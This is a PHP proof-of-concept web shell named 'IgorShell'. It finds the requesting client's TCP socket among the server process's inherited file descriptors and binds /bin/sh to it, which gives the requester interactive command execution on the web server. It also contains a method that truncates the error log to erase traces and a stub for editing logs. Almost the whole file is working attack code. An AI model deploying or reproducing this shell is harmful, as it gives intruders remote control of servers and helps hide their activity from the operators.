<?php

/*
 *	Fd PoC
 *	Author: Brian Heese
 *	Date: 05-08-2013
 */

// Disable timing out as we wish to facilitate a statefull shell session.
set_time_limit(0);

// TODO: Set debug info to false when releasing to production.
ini_set('error_reporting', E_ALL);
ini_set('display_errors', true);

class IgorShell {

	private $m_Shell = '/bin/sh';

	private $m_Pid;
	private $m_Nice;
	private $m_FileDescriptors;
	private $m_BossIp;
	private $m_BossPort;
	private $m_BossSock;

	public function __construct() {
		echo $this->m_Pid 				= getmypid();
		$this->m_Nice 				= $this->getProcessNice();
		$this->m_FileDescriptors	= array();
		$this->m_BossIp				= $_SERVER['REMOTE_ADDR'];
		$this->m_BossPort			= $_SERVER['REMOTE_PORT'];
	}

	/**
	 *	Fetch current process priority
	 *	0 is highest, thus the higher the number
	 *	the lower the priority of the process.
	 */
	private function getProcessNice ($pid = null) {

	    if (!$pid) {
	        $pid = $this->m_Pid;
	    }
	    
	    // Execute ps -p [pid] -o %p %n in shell    
	    $res = `ps -p $pid -o "%p %n"`;
	    
	    // Fetch info we want from output    
	    preg_match ('/^\s*\w+\s+\w+\s*(\d+)\s+(\d+)/m', $res, $matches);
	    
	    // Return Pid and priority    
	    return array ('pid' => (isset ($matches[1]) ? $matches[1] : null), 'nice' => (isset ($matches[2]) ? $matches[2] : null));
	}

	/**
	 *	Method which enumerates all inherited file descriptors
	 *	and looks up all relevant info for each.
	 *	Dep: PHP >= 5.3.6
	 */
	private function getFileDescriptors(  ) {

		$it = new DirectoryIterator("glob:///proc/self/fd/*");
		foreach($it as $f) {

			$tmpArr = array();

			// Create resource from fd
			$tmpArr['fd'] 		= $fd = fopen("php://fd/" . $f->getFilename(), 'r+');

			// Determine type
		    $details 			= stream_get_meta_data($fd);
		    $tmpArr['type'] 	= $details['stream_type'];

		    // Determine Blocked / Non-Blocked state
		    $tmpArr['state'] 	= $details['blocked'];

		    // Determine uri
		    $tmpArr['uri'] 		= $details['uri'];

		    // fd mode
		    $tmpArr['mode']		= $details['mode'];

            // retrieve filepath
            $tmpArr['filepath'] = readlink('/proc/'.$this->m_Pid.'/fd/'.$f->getFilename());

            // Save
		    $this->m_FileDescriptors[ $f->getFilename() ] = $tmpArr;
		}	
	}

	public function printFileDescriptors(  ) {
		
		if(!$this->m_FileDescriptors)
			$this->getFileDescriptors();

		foreach ( $this->m_FileDescriptors as $id => $fd ) {
			echo 'FD #' . $id . ': ' . print_r( $fd, true ) . '<br />';
		}
	}

	private function whipeLog( $fd = null ) {
		
		// Default fd for log
		if( $fd == null )
			$fd = $this->m_FileDescriptors['2'];

		// Truncate filesize to 0 & close resource
		ftruncate($fd, 0);
		fclose($fd);

		// TODO: Add verficication to check if whipe succeeded
	}

	/**
	 *	Method that reads contents of log file referenced by fd
	 *	performs some basic manipulations on the data and
	 *	overwrites the log with manipulated version.
	 */
	private function editLog( $fd = null ) {
		// TODO: implement me.
	}

	/**
	 *	Findsock method iterates over socket descriptors found
	 *	untill it's found the requesting socket.
	 */
	public function findSock() {
		
		if(!$this->m_FileDescriptors)
			$this->getFileDescriptors();

		foreach( $this->m_FileDescriptors as $id => $d ) {

			// Skip if fd is not a socket
			if( $d['type'] != 'tcp_socket' )
				continue;

			$remote = stream_socket_get_name($d['fd'], true);
			
			if( $remote == $this->m_BossIp . ':' . $this->m_BossPort) {

				// Sock found!
				$this->m_BossSock = $d['fd'];

				if( is_resource($this->m_BossSock) )
					echo 'Found socket!\n';
				else
					die('weird...');
				return;
			}
		}
	}

	public function hookShell() {

		// Check if sock has been found
		if( !is_resource($this->m_BossSock) )
			$this->findSock();

		// Disable blocking for socket stream
		socket_set_nonblock($this->m_BossSock);

		// Close control pipes
		$p1 = fopen('php://fd/4', 'w');
		$p2 = fopen('php://fd/5', 'w');
		ftruncate($p1, 0);
		ftruncate($p2, 0);
		fclose($p2);
		fclose($p1);

		// Prepare io pipes
		$io = array(
                0 => $this->m_BossSock,
                1 => $this->m_BossSock,
                2 => $this->m_BossSock
        	);

		// Prepare environment variables
		$env = array('SHELL'=>'/bin/bash','TERM'=>'xterm-color','USER'=>'root','LS_COLORS'=>'rs=0:di=01;34:ln=01;36:hl=44;37:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:','SUDO_USER'=>'notroot','SUDO_UID'=>'1000','USERNAME'=>'root','PATH'=>'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/X11R6/bin','MAIL'=>'/var/mail/notroot','PWD'=>'/home/notroot','LANG'=>'en_US.UTF-8','SHLVL'=>'1','SUDO_COMMAND'=>'/bin/bash','HOME'=>'/home/notroot','LOGNAME'=>'root','LC_CTYPE'=>'UTF-8','LESSOPEN'=>'| /usr/bin/lesspipe %s','SUDO_GID'=>'1000','LESSCLOSE'=>'/usr/bin/lesspipe %s %s','_'=>'/usr/bin/env');

		posix_setsid ();
		// Spawn shell process and attach pipes
		$proc = proc_open(	$this->m_Shell, 
							$io, 
							$pipes
						);

		// Check if process spawned successfully
		if( !is_resource($proc) )
			die('Failed to spawn shell process');

		// Main loop
		while( is_resource($this->m_BossSock) ) {
			
			// Fetch proc and sock states
			$procState = proc_get_status($proc);

			// Check if either one is dead
			if( $procState['running'] === false ) {

				// Clean up
				fflush($this->m_BossSock);
				fclose($this->m_BossSock);
				proc_close($proc);
			}

			sleep(1000);
		}
	}
}

$is = new IgorShell();
$is->hookShell();
